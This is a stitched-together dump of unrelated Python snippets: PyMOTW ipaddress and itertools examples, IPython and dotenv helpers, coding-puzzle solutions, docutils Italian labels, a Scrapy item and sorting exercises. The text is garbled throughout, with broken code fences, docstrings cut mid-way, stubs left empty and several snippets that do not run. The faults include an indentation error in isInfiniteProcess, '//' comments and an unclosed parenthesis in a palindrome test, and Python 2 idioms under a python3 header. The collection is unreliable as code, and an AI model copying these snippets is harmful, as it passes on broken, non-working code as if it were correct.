    print("  packed form:", binascii.hexlify(addr.packed))
    print("      integer:", int(addr))
    print()

#!/usr/bin/env python
# encoding: utf-8
#
# Copyright (c) 2016 Doug Hellmann.  All rights reserved.
# Written for https://pymotw.com
#```









---


```py


# end_pymotw_header
import ipaddress


ADDRESSES = ["10.9.0.6/24", "fdfd:87b5:b475:5e3e:b1bc:e121:a8eb:14aa/64"]


for ip in ADDRESSES:
    iface = ipaddress.ip_interface(ip)
    print("{!r}".format(iface))
    print("network:\n  ", iface.network)
    print("ip:\n  ", iface.ip)
    print("IP with prefixlen:\n  ", iface.with_prefixlen)
    print("netmask:\n  ", iface.with_netmask)
    print("hostmask:\n  ", iface.with_hostmask)
    print()

#!/usr/bin/env python
# encoding: utf-8
#
# Copyright (c) 2016 Doug Hellmann.  All rights reserved.
# Written for https://pymotw.com
#```









---


```py


#end_pymotw_header
import ipaddress

NETWORKS = [
    '10.9.0.0/24',
    'fdfd:87b5:b475:5e3e::/64',
]

for n in NETWORKS:
    net = ipaddress.ip_network(n)
    print('{!r}'.format(net))
    for i, ip in zip(range(3), net):
        print(ip)
    print()

#!/usr/bin/env python
# encoding: utf-8
#
# Copyright (c) 2016 Doug Hellmann.  All rights reserved.
# Written for https://pymotw.com
#```









---


```py


#end_pymotw_header
import ipaddress

NETWORKS = [
    '10.9.0.0/24',
    'fdfd:87b5:b475:5e3e::/64',
]

for n in NETWORKS:
    net = ipaddress.ip_network(n)
    print('{!r}'.format(net))
    for i, ip in zip(range(3), net.hosts()):
        print(ip)
    print()

#!/usr/bin/env python
# encoding: utf-8
#
# Copyright (c) 2016 Doug Hellmann.  All rights reserved.
# Written for https://pymotw.com
#```









---


```py


# end_pymotw_header
import ipaddress


NETWORKS = [
    ipaddress.ip_network("10.9.0.0/24"),
    ipaddress.ip_network("fdfd:87b5:b475:5e3e::/64"),
]

ADDRESSES = [
    ipaddress.ip_address("10.9.0.6"),
    ipaddress.ip_address("10.7.0.31"),
    ipaddress.ip_address("fdfd:87b5:b475:5e3e:b1bc:e121:a8eb:14aa"),
    ipaddress.ip_address("fe80::3840:c439:b25e:63b0"),
]


for ip in ADDRESSES:
    for net in NETWORKS:
        if ip in net:
            print("{}\nis on {}".format(ip, net))
            break
    else:
        print("{}\nis not on a known network".format(ip))
    print()

#!/usr/bin/env python
# encoding: utf-8
#
# Copyright (c) 2016 Doug Hellmann.  All rights reserved.
# Written for https://pymotw.com
#```









---


```py


# end_pymotw_header
import ipaddress

NETWORKS = ["10.9.0.0/24", "fdfd:87b5:b475:5e3e::/64"]

for n in NETWORKS:
    net = ipaddress.ip_network(n)
    print("{!r}".format(net))
    print("     is private:", net.is_private)
    print("      broadcast:", net.broadcast_address)
    print("     compressed:", net.compressed)
    print("   with netmask:", net.with_netmask)
    print("  with hostmask:", net.with_hostmask)
    print("  num addresses:", net.num_addresses)
    print()
````

````pyEntry point for launching an IPython kernel.

This is separate from the ipykernel package so we can avoid doing imports until
after removing the cwd from sys.path.```


```py

import sys

if __name__ == '__main__':
    # Remove the CWD from sys.path while we load stuff.
    # This is added back by InteractiveShellApp.init_path()
    if sys.path[0] == '':
        del sys.path[0]

    from ipykernel import kernelapp as app
    app.launch_new_instance()

from __future__ import print_function

from IPython.core.magic import Magics, line_magic, magics_class  # type: ignore
from IPython.core.magic_arguments import (
    argument,
    magic_arguments,  # type: ignore
    parse_argstring,
)  # type: ignore

from .main import find_dotenv, load_dotenv


@magics_class
class IPythonDotEnv(Magics):
    @magic_arguments()
    @argument(
        "-o",
        "--override",
        action="store_true",
        help="Indicate to override existing variables",
    )
    @argument(
        "-v",
        "--verbose",
        action="store_true",
        help="Indicate function calls to be verbose",
    )
    @argument(
        "dotenv_path",
        nargs="?",
        type=str,
        default=".env",
        help="Search in increasingly higher folders for the `dotenv_path`",
    )
    @line_magic
    def dotenv(self, line):
        args = parse_argstring(self.dotenv, line)
        # Locate the .env file
        dotenv_path = args.dotenv_path
        try:
            dotenv_path = find_dotenv(dotenv_path, True, True)
        except IOError:
            print("cannot find .env file")
            return

        # Load the .env file
        load_dotenv(dotenv_path, verbose=args.verbose, override=args.override)


def load_ipython_extension(ipython):
    """Register the %dotenv magic."""
    ipython.register_magics(IPythonDotEnv)

import warnings
warnings.warn("qtconsole.ipython_widget is deprecated; "
              "use qtconsole.jupyter_widget", DeprecationWarning)
from .jupyter_widget import *

def decrypt(word, dictionary):
    lst = []
    for c in word:
        lst.append(dictionary[c])
    return "".join(lst)


def isCryptSolution(crypt, solution):
    dict = {}
    for r in solution:
        dict[r[0]] = r[1]
    values = [0] * 3
    for i in range(3):
        val = decrypt(crypt[i], dict)
        if val.startswith("0") and len(val) > 1:
            return False
        values[i] = int(val)

    return (values[0] + values[1]) == values[2]

import ipaddress


def isIPv4Address(inputString):
    try:
        ip = ipaddress.ip_address(inputString)
        return True
    except ValueError:
        return False

def isIdentityMatrix(matrix):
    flag = True

    for i in range(len(matrix)):
        for j in range(len(matrix[i])):

            if i == j:
                if matrix[i][j] != 1:
                    return False
            elif matrix[i][j] != 0:
                return False

    return flag

import re
````

````pyisMAC48Address

    A media access control address (MAC address)
    is a unique identifier assigned to network
    interfaces for communications on the physical
    network segment.

    The standard (IEEE 802) format for printing
    MAC-48 addresses in human-friendly form is six
    groups of two hexadecimal digits (0 to 9 or A to F),
    separated by hyphens (e.g. 01-23-45-67-89-AB).    ```


```py


def isMAC48Address(inputString):
    """Checks if inputString is a valid MAC48 address

    Args:
        inputString(string): String to check

    Return:
        Boolean indicating if string is valid MAC48 address

    Raises:
    """
    if re.match(
        "[0-9a-f]{2}([-:])[0-9a-f]{2}(\\1[0-9a-f]{2}){4}$", inputString.lower()
    ):
        return True
    else:
        return False

#
# Binary trees are already defined with this interface:
# class Tree(object):
#   def __init__(self, x):
#     self.value = x
#     self.left = None
#     self.right = None
def isSubtree(t1, t2):
    def isEqual(left, right):
        if left == None and right == None:
            return True
        if right == None and left != None:
            return False
        if left == None and right != None:
            return False

        return (
            left.value == right.value
            and isEqual(left.right, right.right)
            and isEqual(left.left, right.left)
        )

    # Base Case
    if t2 is None:
        return True

    if t1 is None:
        return False

    # Check the tree with root as current node
    if isEqual(t1, t2):
        return True

    # IF the tree with root as current node doesn't match
    # then try left and right subtreee one by one
    return isSubtree(t1.left, t2) or isSubtree(t1.right, t2)

def isSum(value):
    s = 0
    for i in range(100):
        s += i
        if s == value:
            return True

#
# Binary trees are already defined with this interface:
# class Tree(object):
#   def __init__(self, x):
#     self.value = x
#     self.left = None
#     self.right = None


def isEqual(left, right):
    if left == None and right == None:
        return True
    if right == None and left != None:
        return False
    if left == None and right != None:
        return False
    if left.value != right.value:
        return False

    return isEqual(left.right, right.left) and isEqual(left.left, right.right)


def isTreeSymmetric(t):
    if t == None:
        return True
    return isEqual(t.left, t.right)

# Let's say a triple (a, b, c) is a zigzag if either a < b > c or a > b < c.
#
# Given an array of integers numbers, your task is to check all the triples of its consecutive elements for being a zigzag. More formally, your task is to construct an array of length numbers.length - 2, where the ith element of the output array equals 1 if the triple (numbers[i], numbers[i + 1], numbers[i + 2]) is a zigzag, and 0 otherwise.
#
# Example
#
# For numbers = [1, 2, 1, 3, 4], the output should be isZigzag(numbers) = [1, 1, 0].
#
# (numbers[0], numbers[1], numbers[2]) = (1, 2, 1) is a zigzag, because 1 < 2 > 1;
# (numbers[1], numbers[2] , numbers[3]) = (2, 1, 3) is a zigzag, because 2 > 1 < 3;
# (numbers[2], numbers[3] , numbers[4]) = (1, 3, 4) is not a zigzag, because 1 < 3 < 4;
# For numbers = [1, 2, 3, 4], the output should be isZigzag(numbers) = [0, 0];
#
# Since all the elements of numbers are increasing, there are no zigzags.
#
# For numbers = [1000000000, 1000000000, 1000000000], the output should be isZigzag(numbers) = [0].
#
# Since all the elements of numbers are the same, there are no zigzags.
#
# Input/Output
#
# [execution time limit] 4 seconds (py3)
#
# [input] array.integer numbers
#
# An array of integers.
#
# Guaranteed constraints:
# 3 ≤ numbers.length ≤ 100,
# 1 ≤ numbers[i] ≤ 109.
#
# [output] array.integer
#
# Return an array, where the ith element equals 1 if the triple (numbers[i], numbers[i + 1], numbers[i + 2]) is a zigzag, and 0 otherwise.
def isZigzag(numbers):
````

````py
Ascending Linked List

Determine whether the sequence of items is ascending so that its each element is strictly larger
than (and not merely equal to) the element that precedes it. Return True if that is the case, and
return False otherwise.

Input: -5 -> 10 -> 99 -> 123456
Output: True

=========================================
Iterate node by node and compare the current value with the next value.
If the next node is smaller or equal return false.
    Time Complexity:    O(N)
    Space Complexity:   O(1)```


```py


############
# Solution #
############

# import ListNode class from ll_helpers.py
from ll_helpers import ListNode


def is_ascending_ll(ll):
    while ll.next != None:
        if ll.val >= ll.next.val:
            return False
        ll = ll.next

    return True


###########
# Testing #
###########

# import build_ll method from ll_helpers.py
from ll_helpers import build_ll

# Test 1
# Correct result => True
print(is_ascending_ll(build_ll([-5, 10, 99, 123456])))

# Test 2
# Correct result => False
print(is_ascending_ll(build_ll([2, 3, 3, 4, 5])))

def isBeautifulString(inputString):
    b = dict()

    for char in inputString:
        if ord(char) in b:
            b[ord(char)] += 1
        else:
            b[ord(char)] = 1

    for i in b.keys():
        if i == 97:
            continue
        if i - 1 in b:
            if b[i] > b[i - 1]:
                return False
        else:
            return False
    return True
````

````py
Given a binary tree, determine if it is a valid binary search tree (BST).

Assume a BST is defined as follows:

The left subtree of a node contains only nodes
with keys less than the node's key.
The right subtree of a node contains only nodes
with keys greater than the node's key.
Both the left and right subtrees must also be binary search trees.
Example 1:
    2
   / \
  1   3
Binary tree [2,1,3], return true.
Example 2:
    1
   / \
  2   3
Binary tree [1,2,3], return false.```


```py


def is_bst(root):
    """
    :type root: TreeNode
    :rtype: bool
    """

    stack = []
    pre = None

    while root or stack:
        while root:
            stack.append(root)
            root = root.left
        root = stack.pop()
        if pre and root.val <= pre.val:
            return False
        pre = root
        root = root.right

    return True

def isCryptSolution(crypt, solution):
    decoded_words, decoded_word = [], ""

    # Decode the words in the cryptarithm
    for i in range(len(crypt)):
        for j in range(len(crypt[i])):
            for k in range(len(solution)):
                if crypt[i][j] == solution[k][0]:
                    decoded_word += solution[k][1]
        decoded_words.append(decoded_word)
        decoded_word = ""

    # Check if the leading digits of
    # any of the words is 0
    for word in decoded_words:
        if word[0] == "0" and len(word) > 1:
            return False

    # Check if it is a valid arithmetic expression
    word1 = int(decoded_words[0])
    word2 = int(decoded_words[1])
    word3 = int(decoded_words[2])

    if word1 + word2 == word3:
        return True
    else:
        return False

def isInfiniteProcess(a, b):
 """
 Given integers a and b, determine whether the following
 pseudocode results in an infinite loop

 while a is not equal to b do
  increase a by 1
  decrease b by 1

 Assume that the program is executed on a virtual machine
 which can store arbitrary long numbers and execute forever.
 """
    return a % 2 != b % 2 or a > b
def isLucky(n):
    digits = [int(digit) for digit in str(n)]
    if len(digits) % 2 == 1:
        return False
    else:
        digits = [int(digit) for digit in str(n)]
        mid = len(digits) // 2
        if sum(digits[:mid]) == sum(digits[mid:]):
            return True
        else:
            return False

#!/usr/bin/python
# -*- coding: utf-8 -*-

# Palindrome is a special string, is same if reversed
# e.g. noon, racecar, et cetera
# Notice in above strings, there is no difference between
# string and it's reversed form

# Function checks if given string is a palindrome or not
# string[::-1] is a clever way to reverse string
# string from start index to end index
# whose difference is -1(reverse)
# found on stack overflow, very pythonic


def is_palindrome(s):
    if s[::-1] == s:
        return True
    return False



import string

def is_palindrome(s):
 # String Clenasing
 s = "".join([char for char in list(s.lower()) if char in list(string.ascii_lowercase)])

 # (index+1) * -1 gives negative index of corresponding counterpart
 # for e.g. s = "noon"  s[0] = s[-1] = "n"  and so on
 #  all() and list comprehensions make task so easy!!
 return all([s[index]==s[(index+1)*-1] for index in range(0, len(s))])


# Tests
print(is_palindrome("racecar"))
print(is_palindrome("ra cec, a?r   "))  // True
print(is_palindrome("noooonnn"))
print(is_palindrome("cool..eh")
````

````py
Given a stack, a function is_sorted accepts a stack as a parameter and returns
true if the elements in the stack occur in ascending increasing order from
bottom, and false otherwise. That is, the smallest element should be at bottom

For example:
bottom [6, 3, 5, 1, 2, 4] top
The function should return false
bottom [1, 2, 3, 4, 5, 6] top
The function should return true```


```py


def is_sorted(stack):
    storage_stack = []
    for i in range(len(stack)):
        if len(stack) == 0:
            break
        first_val = stack.pop()
        if len(stack) == 0:
            break
        second_val = stack.pop()
        if first_val < second_val:
            return False
        storage_stack.append(first_val)
        stack.append(second_val)

    # Backup stack
    for i in range(len(storage_stack)):
        stack.append(storage_stack.pop())

    return True
````

````py
References: wikipedia:square free number
python/black : True
flake8 : True```


```py
from __future__ import annotations


def is_square_free(factors: list[int]) -> bool:
    """
    # doctest: +NORMALIZE_WHITESPACE
    This functions takes a list of prime factors as input.
    returns True if the factors are square free.
    >>> is_square_free([1, 1, 2, 3, 4])
    False

    These are wrong but should return some value
    it simply checks for repition in the numbers.
    >>> is_square_free([1, 3, 4, 'sd', 0.0])
    True

    >>> is_square_free([1, 0.5, 2, 0.0])
    True
    >>> is_square_free([1, 2, 2, 5])
    False
    >>> is_square_free('asd')
    True
    >>> is_square_free(24)
    Traceback (most recent call last):
        ...
    TypeError: 'int' object is not iterable
    """
    return len(set(factors)) == len(factors)


if __name__ == "__main__":
    import doctest

    doctest.testmod()

# Given two strings a and b, determine if they are isomorphic.

# Two strings are isomorphic if the characters in a can be replaced to get b.

# All occurrences of a character must be replaced with another character while preserving the order of characters. No two characters may map to the same character but a character may map to itself.

# Example 1:

# Input:
# a = "odd"
# b = "egg"

# Output:
# true
# Example 2:

# Input:
# a = "foo"
# b = "bar"

# Output:
# false
# Example 3:

# Input:
# a = "abca"
# b = "zbxz"

# Output:
# true
# Example 4:

# Input:
# a = "abc"
# b = ""

# Output:
# false
# [execution time limit] 4 seconds (py3)

# [input] string a

# [input] string b

# [output] boolean


def csIsomorphicStrings(a, b):
    max_chars = 256
    m = len(a)
    n = len(b)
    if m != n:
        return False
    marked = [False] * max_chars
    map = [-1] * max_chars
    for i in range(n):
        if map[ord(a[i])] == -1:
            if marked[ord(b[i])] == True:
                return False
            marked[ord(b[i])] = True
            map[ord(a[i])] = b[i]

        elif map[ord(a[i])] != b[i]:
            return False

    return True

from util import Queue

# island count problem


def island_counter(arr):
    rows = len(arr)
    cols = len(arr[0])
    count = 0
    for i in range(rows):
        for j in range(cols):
            if arr[i][j] == 1:
                deleteOnes(arr, i, j, rows, cols)
                count += 1

    return count


def deleteOnes(grid, i, j, rows, cols):
    q = Queue()
    q.enqueue([i, j])
    grid[i][j] = 0

    while q.size() > 0:
        node = q.dequeue()
        row = node[0]
        col = node[1]
        for row2, col2 in (
            (row + 1, col),
            (row - 1, col),
            (row, col + 1),
            (row, col - 1),
        ):
            if 0 <= row2 < rows and 0 <= col2 < cols and grid[row2][col2] != 0:
                grid[row2][col2] = 0
                q.enqueue([row2, col2])


islands = [
    [0, 1, 0, 1, 0],
    [1, 1, 0, 1, 1],
    [0, 0, 1, 0, 0],
    [1, 0, 1, 0, 0],
    [1, 1, 0, 0, 0],
]

island_counter(islands)  # 4

islands = [
    [1, 0, 0, 1, 1, 0, 1, 1, 0, 1],
    [0, 0, 1, 1, 0, 1, 0, 0, 0, 0],
    [0, 1, 1, 1, 0, 0, 0, 1, 0, 1],
    [0, 0, 1, 0, 0, 1, 0, 0, 1, 1],
    [0, 0, 1, 1, 0, 1, 0, 1, 1, 0],
    [0, 1, 0, 1, 1, 1, 0, 1, 0, 0],
    [0, 0, 1, 0, 0, 1, 1, 0, 0, 0],
    [1, 0, 1, 1, 0, 0, 0, 1, 1, 0],
    [0, 1, 1, 0, 0, 0, 1, 1, 0, 0],
    [0, 0, 1, 1, 0, 1, 0, 0, 1, 0],
]

island_counter(islands)  # 13
````

````py
Author: OMKAR PATHAK
Created On: 17th August 2017```


```py
import inspect


def is_isogram(word):
    """
    An isogram (also known as a "nonpattern word")
    is a logological term for a word or phrase
    without a repeating letter

    :param word: word to check
    :return: bool
    """

    # Make an empty list to append unique letters
    letter_list = []
    for letter in word.lower():
        # If letter is an alphabet then only check
        if letter.isalpha():
            if letter in letter_list:
                return False
            letter_list.append(letter)
    return True


def get_code():
    """
    returns the code for the is_isogram function
    :return: source code
    """
    return inspect.getsource(is_isogram)

# $Id: it.py 4564 2006-05-21 20:44:42Z wiemann $
# Author: Nicola Larosa <docutils@tekNico.net>
# Copyright: This module has been placed in the public domain.

# New language mappings are welcome.  Before doing a new translation, please
# read <http://docutils.sf.net/docs/howto/i18n.html>.  Two files must be
# translated for each language: one in docutils/languages, the other in
# docutils/parsers/rst/languages.
````

````py
Italian-language mappings for language-dependent features of Docutils.```


```py

__docformat__ = "reStructuredText"

labels = {
    "author": "Autore",
    "authors": "Autori",
    "organization": "Organizzazione",
    "address": "Indirizzo",
    "contact": "Contatti",
    "version": "Versione",
    "revision": "Revisione",
    "status": "Status",
    "date": "Data",
    "copyright": "Copyright",
    "dedication": "Dedica",
    "abstract": "Riassunto",
    "attention": "Attenzione!",
    "caution": "Cautela!",
    "danger": "!PERICOLO!",
    "error": "Errore",
    "hint": "Suggerimento",
    "important": "Importante",
    "note": "Nota",
    "tip": "Consiglio",
    "warning": "Avvertenza",
    "contents": "Indice",
}```


```pyMapping of node class name to label text."""

bibliographic_fields = {
    "autore": "author",
    "autori": "authors",
    "organizzazione": "organization",
    "indirizzo": "address",
    "contatto": "contact",
    "versione": "version",
    "revisione": "revision",
    "status": "status",
    "data": "date",
    "copyright": "copyright",
    "dedica": "dedication",
    "riassunto": "abstract",
}```


```pyItalian (lowcased) to canonical name mapping for bibliographic fields."""

author_separators = [";", ","]```


```pyList of separator strings for the 'Authors' bibliographic field. Tried in
order."""

class Item:
    def __init__(self, name, description):
        self.name = name
        self.description = description

    def __str__(self):
        return f"{self.name}\n{self.description}"```


```pyAlgorithm for finding index of element in an array"""

def index(array, item):
 index = 0
 found = False
 while (not found):
  if (array[index] == item):
   found = True
  else:
   index = index + 1
 return index

print index([12, 34], 34)
# -*- coding: utf-8 -*-

# Define here the models for your scraped items
#
# See documentation in:
# http://doc.scrapy.org/en/latest/topics/items.html

import scrapy


class FundrazrItem(scrapy.Item):
    campaignTitle = scrapy.Field()
    amountRaised = scrapy.Field()
    goal = scrapy.Field()
    currencyType = scrapy.Field()
    endDate = scrapy.Field()
    numberContributors = scrapy.Field()
    story = scrapy.Field()
    url = scrapy.Field()
````

````py
Author : Syed Faizan (3rd Year Student IIIT Pune)
github : faizan2700
You are given a bitmask m and you want to efficiently iterate through all of
its submasks. The mask s is submask of m if only bits that were included in
bitmask are set```


```py
from __future__ import annotations


def list_of_submasks(mask: int) -> list[int]:

    """
    Args:
        mask : number which shows mask ( always integer > 0, zero does not have any
            submasks )

    Returns:
        all_submasks : the list of submasks of mask (mask s is called submask of mask
        m if only bits that were included in original mask are set

    Raises:
        AssertionError: mask not positive integer

    >>> list_of_submasks(15)
    [15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1]
    >>> list_of_submasks(13)
    [13, 12, 9, 8, 5, 4, 1]
    >>> list_of_submasks(-7)  # doctest: +ELLIPSIS
    Traceback (most recent call last):
        ...
    AssertionError: mask needs to be positive integer, your input -7
    >>> list_of_submasks(0)  # doctest: +ELLIPSIS
    Traceback (most recent call last):
        ...
    AssertionError: mask needs to be positive integer, your input 0

    """

    assert (
        isinstance(mask, int) and mask > 0
    ), f"mask needs to be positive integer, your input {mask}"
````

```py
    """
    first submask iterated will be mask itself then operation will be performed
    to get other submasks till we reach empty submask that is zero ( zero is not
    included in final submasks list )
    """
    all_submasks = []
    submask = mask

    while submask:
        all_submasks.append(submask)
        submask = (submask - 1) & mask

    return all_submasks




if __name__ == "__main__":
    import doctest

    doctest.testmod()
```

Implementation of iterative merge sort in Python
Author: Aman Gupta

For doctests run following command:
python3 -m doctest -v iterative_merge_sort.py

For manual testing run:
python3 iterative_merge_sort.py```

```py

from __future__ import annotations


def merge(input_list: list, low: int, mid: int, high: int) -> list:
    """
    sorting left-half and right-half individually
    then merging them into result
    """
    result = []
    left, right = input_list[low:mid], input_list[mid : high + 1]
    while left and right:
        result.append((left if left[0] <= right[0] else right).pop(0))
    input_list[low : high + 1] = result + left + right
    return input_list


# iteration over the unsorted list
def iter_merge_sort(input_list: list) -> list:
    """
    Return a sorted copy of the input list

    >>> iter_merge_sort([5, 9, 8, 7, 1, 2, 7])
    [1, 2, 5, 7, 7, 8, 9]
    >>> iter_merge_sort([6])
    [6]
    >>> iter_merge_sort([])
    []
    >>> iter_merge_sort([-2, -9, -1, -4])
    [-9, -4, -2, -1]
    >>> iter_merge_sort([1.1, 1, 0.0, -1, -1.1])
    [-1.1, -1, 0.0, 1, 1.1]
    >>> iter_merge_sort(['c', 'b', 'a'])
    ['a', 'b', 'c']
    >>> iter_merge_sort('cba')
    ['a', 'b', 'c']
    """
    if len(input_list) <= 1:
        return input_list
    input_list = list(input_list)

    # iteration for two-way merging
    p = 2
    while p < len(input_list):
        # getting low, high and middle value for merge-sort of single list
        for i in range(0, len(input_list), p):
            low = i
            high = i + p - 1
            mid = (low + high + 1) // 2
            input_list = merge(input_list, low, mid, high)
        # final merge of last two parts
        if p * 2 >= len(input_list):
            mid = i
            input_list = merge(input_list, 0, mid, len(input_list) - 1)
        p *= 2

    return input_list


if __name__ == "__main__":
    user_input = input("Enter numbers separated by a comma:\n").strip()
    unsorted = [int(item.strip()) for item in user_input.split(",")]
    print(iter_merge_sort(unsorted))

# TO-DO: Complete the selection_sort() function below
# def selection_sort( arr ):
#     # loop through n-1 elements
#     # len(arr) => 5
#     # out of bounds
#     # len(arr) - 1
#     # 4 -> 3
#     for i in range(0, len(arr) - 1): // OBOB
#         cur_index = i
#         smallest_index = cur_index
#         # TO-DO: find next smallest element
#         # (hint, can do in 3 loc)
#         # iterate over a range
#         for j in range(cur_index, len(arr)):
#             if arr[j] < arr[smallest_index]:
#                 smallest_index = j


#         # swap
#         arr[smallest_index], arr[cur_index] = arr[cur_index], arr[smallest_index]

#     return arr

# TO-DO: Complete the selection_sort() function below
def selection_sort(arr):
    # loop through n-1 elements
    for i in range(0, len(arr) - 1):
        # set sorted item index to i
        cur_index = i

        # give smallest a sentinal value
        smallest_index = cur_index
        # TO-DO: find next smallest element
        # loop over elements at right hand side of current index (current index + 1)
        # our ranege is the current index to the len of array - 1
        # loop here
        for j in range(cur_index + 1, len(arr)):
            # check if the number current iteration index is smaller than
            # the number at the smallest index
            # if condition here
            if arr[j] < arr[smallest_index]:
                # if true then set smallest index to iteration index
                smallest_index = j

        # swap number at current index for number at smallest index
        arr[smallest_index], arr[cur_index] = arr[cur_index], arr[smallest_index]
        # arr[smallest_index], arr[cur_index] = 5, 3

        # arr[smallest_index] = 5
        # arr[cur_index] = 3

        # a, b = 5, 3

    # return the array
    return arr


# implement the Insertion Sort function below
def insertion_sort(arr):
    # loop through n-1 elements
    for i in range(1, len(arr)):
        temp = arr[i]
        j = i
        while j > 0 and temp < arr[j - 1]:
            # shift left until correct position found
            arr[j] = arr[j - 1]
            j -= 1
        # insert at correct position
        arr[j] = temp

    return arr


# TO-DO:  implement the Bubble Sort function below
def bubble_sort(arr):

    return arr


# STRETCH: implement the Count Sort function below
def count_sort(arr, maximum=-1):

    return arr
```

````py
Thin wrappers around `itertools`.```


```py
from __future__ import absolute_import

import itertools

from ..auto import tqdm as tqdm_auto

__author__ = {"github.com/": ["casperdcl"]}
__all__ = ["product"]


def product(*iterables, **tqdm_kwargs):
    """
    Equivalent of `itertools.product`.

    Parameters
    ----------
    tqdm_class  : [default: tqdm.auto.tqdm].
    """
    kwargs = tqdm_kwargs.copy()
    tqdm_class = kwargs.pop("tqdm_class", tqdm_auto)
    try:
        lens = list(map(len, iterables))
    except TypeError:
        total = None
    else:
        total = 1
        for i in lens:
            total *= i
        kwargs.setdefault("total", total)
    with tqdm_class(**kwargs) as t:
        for i in itertools.product(*iterables):
            yield i
            t.update()

#!/usr/bin/env python3
# encoding: utf-8```


```pycombine values```


```py

#end_pymotw_header
from itertools import *

print(list(accumulate(range(5))))
print(list(accumulate('abcde')))

#!/usr/bin/env python3
# encoding: utf-8```


```pycombine values```


```py

#end_pymotw_header
from itertools import *


def f(a, b):
    print(a, b)
    return b + a + b


print(list(accumulate('abcde', f)))

#!/usr/bin/env python3```


```pyUsing chain()```


```py

#end_pymotw_header
from itertools import *

for i in chain([1, 2, 3], ['a', 'b', 'c']):
    print(i, end=' ')
print()

#!/usr/bin/env python3```


```pyUsing chain()```


```py

#end_pymotw_header
from itertools import *


def make_iterables_to_chain():
    yield [1, 2, 3]
    yield ['a', 'b', 'c']


for i in chain.from_iterable(make_iterables_to_chain()):
    print(i, end=' ')
print()

#!/usr/bin/env python3
# encoding: utf-8

#end_pymotw_header
from itertools import *


def show(iterable):
    first = None
    for i, item in enumerate(iterable, 1):
        if first != item[0]:
            if first is not None:
                print()
            first = item[0]
        print(''.join(item), end=' ')
    print()


print('Unique pairs:\n')
show(combinations('abcd', r=2))

#!/usr/bin/env python3
# encoding: utf-8

#end_pymotw_header
from itertools import *


def show(iterable):
    first = None
    for i, item in enumerate(iterable, 1):
        if first != item[0]:
            if first is not None:
                print()
            first = item[0]
        print(''.join(item), end=' ')
    print()


print('Unique pairs:\n')
show(combinations_with_replacement('abcd', r=2))

#!/usr/bin/env python3```


```pyUsing filter()```


```py

#end_pymotw_header
from itertools import *

every_third = cycle([False, False, True])
data = range(1, 10)

for i in compress(data, every_third):
    print(i, end=' ')
print()

#!/usr/bin/env python3```


```pyUsing count()```


```py

#end_pymotw_header
from itertools import *

for i in zip(count(1), ['a', 'b', 'c']):
    print(i)

#!/usr/bin/env python3```


```pyUsing count()```


```py

#end_pymotw_header
import fractions
from itertools import *

start = fractions.Fraction(1, 3)
step = fractions.Fraction(1, 3)

for i in zip(count(start, step), ['a', 'b', 'c']):
    print('{}: {}'.format(*i))

#!/usr/bin/env python3```


```pyUsing cycle().```


```py

#end_pymotw_header
from itertools import *

for i in zip(range(7), cycle(['a', 'b', 'c'])):
    print(i)

#!/usr/bin/env python3```


```pyUsing dropwhile()```


```py

#end_pymotw_header
from itertools import *


def should_drop(x):
    print('Testing:', x)
    return x < 1


for i in dropwhile(should_drop, [-1, 0, 1, 2, -2]):
    print('Yielding:', i)

#!/usr/bin/env python3```


```pyUsing filter()```


```py

#end_pymotw_header
from itertools import *


def check_item(x):
    print('Testing:', x)
    return x < 1


for i in filter(check_item, [-1, 0, 1, 2, -2]):
    print('Yielding:', i)

#!/usr/bin/env python3```


```pyUsing filterfalse()```


```py

#end_pymotw_header
from itertools import *


def check_item(x):
    print('Testing:', x)
    return x < 1


for i in filterfalse(check_item, [-1, 0, 1, 2, -2]):
    print('Yielding:', i)

#!/usr/bin/env python3```


```pyUsing groupby()```


```py

#end_pymotw_header
from itertools import *
from operator import itemgetter

d = dict(a=1, b=2, c=1, d=2, e=1, f=2, g=3)
di = sorted(d.iteritems(), key=itemgetter(1))
for k, g in groupby(di, key=itemgetter(1)):
    print(k, map(itemgetter(0), g))

#!/usr/bin/env python3```


```pyGrouping sequential values with groupby().```


```py

# end_pymotw_header
import functools
from itertools import *
import operator
import pprint


@functools.total_ordering
class Point:
    def __init__(self, x, y):
        self.x = x
        self.y = y

    def __repr__(self):
        return "({}, {})".format(self.x, self.y)

    def __eq__(self, other):
        return (self.x, self.y) == (other.x, other.y)

    def __gt__(self, other):
        return (self.x, self.y) > (other.x, other.y)


# Create a dataset of Point instances
data = list(map(Point, cycle(islice(count(), 3)), islice(count(), 7)))
print("Data:")
pprint.pprint(data, width=35)
print()

# Try to group the unsorted data based on X values
print("Grouped, unsorted:")
for k, g in groupby(data, operator.attrgetter("x")):
    print(k, list(g))
print()

# Sort the data
data.sort()
print("Sorted:")
pprint.pprint(data, width=35)
print()

# Group the sorted data based on X values
print("Grouped, sorted:")
for k, g in groupby(data, operator.attrgetter("x")):
    print(k, list(g))
print()

#!/usr/bin/env python3```


```pyUsing islice()```


```py

#end_pymotw_header
from itertools import *

print('Stop at 5:')
for i in islice(range(100), 5):
    print(i, end=' ')
print('\n')

print('Start at 5, Stop at 10:')
for i in islice(range(100), 5, 10):
    print(i, end=' ')
print('\n')

print('By tens to 100:')
for i in islice(range(100), 0, 100, 10):
    print(i, end=' ')
print('\n')

#!/usr/bin/env python3```


```pyUsing map()```


```py

#end_pymotw_header

def times_two(x):
    return 2 * x


def multiply(x, y):
    return (x, y, x * y)


print('Doubles:')
for i in map(times_two, range(5)):
    print(i)

print('\nMultiples:')
r1 = range(5)
r2 = range(5, 10)
for i in map(multiply, r1, r2):
    print('{:d} * {:d} = {:d}'.format(*i))

print('\nStopping:')
r1 = range(5)
r2 = range(2)
for i in map(multiply, r1, r2):
    print(i)

#!/usr/bin/env python3
# encoding: utf-8

#end_pymotw_header
from itertools import *


def show(iterable):
    first = None
    for i, item in enumerate(iterable, 1):
        if first != item[0]:
            if first is not None:
                print()
            first = item[0]
        print(''.join(item), end=' ')
    print()


print('All permutations:\n')
show(permutations('abcd'))

print('\nPairs:\n')
show(permutations('abcd', r=2))

#!/usr/bin/env python3
# encoding: utf-8

#end_pymotw_header
from itertools import *
import pprint

FACE_CARDS = ('J', 'Q', 'K', 'A')
SUITS = ('H', 'D', 'C', 'S')

DECK = list(
    product(
        chain(range(2, 11), FACE_CARDS),
        SUITS,
    )
)

for card in DECK:
    print('{:>2}{}'.format(*card), end=' ')
    if card[1] == SUITS[-1]:
        print()

#!/usr/bin/env python3
# encoding: utf-8

#end_pymotw_header
from itertools import *
import pprint

FACE_CARDS = ('J', 'Q', 'K', 'A')
SUITS = ('H', 'D', 'C', 'S')

DECK = list(
    product(
        SUITS,
